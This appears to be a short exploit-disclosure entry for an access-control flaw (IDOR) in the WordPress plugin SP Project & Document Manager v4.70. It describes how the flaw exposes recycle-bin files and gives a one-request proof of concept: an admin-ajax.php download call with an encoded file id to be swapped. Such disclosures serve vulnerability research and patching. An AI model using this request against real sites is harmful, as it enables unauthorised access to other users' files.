# Exploit Title: SP Project & Document Manager v4.70 - Insecure Direct Object Reference(IDOR)
## Date: 2/20/2024
## Vendor Homepage: https://cn.wordpress.org/plugins/sp-client-document-manager/
## Tested on: Debian Linux, Apache, Mysql
## Vendor: SP Project & Document Manager
## Version: v4.70
## Exploit Description:
## SP Project & Document Manager v4.70 suffers from IDOR - Broken Access Control Vulnerability allowing attackers to download files that is in recycle bin(horizontal privilege escalation).

## ---------------------------------POC-----------------------------
```
GET /wp-admin/admin-ajax.php?cdm-download-file-id=NHwyMDIzLTEwLTA1IDE2OjA0OjA3fDI4NS5qcGc=(CHANGE HERE) HTTP/1.1
...

```
